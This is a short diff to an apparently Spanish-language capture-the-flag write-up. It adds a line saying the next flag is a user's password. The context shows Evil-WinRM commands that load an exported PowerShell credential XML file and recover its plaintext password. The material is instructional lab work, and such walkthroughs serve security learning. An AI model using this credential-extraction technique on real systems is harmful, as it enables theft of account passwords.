@@ -445,6 +445,8 @@ d-r---        9/15/2018  12:19 AM                Videos
 
  Y dentro de ese archivo hay un campo con lo que parece un hash. Indicando que es una flag.
 
+Vale. La siguiente flag es la contraseña de Xyan1d3
+
 Investigando un poco, veo que es un archivo de powershell exportado. Y ejecuto los siguientes comandos para conseguir la flag.
 *Evil-WinRM* PS C:\Users\lvetrova> $cred = Import-CliXml -Path C:\Users\lvetrova\lvetrova.xml //Carga el archivo
 *Evil-WinRM* PS C:\Users\lvetrova> $cred.GetNetworkCredential().Password //consigue la flag
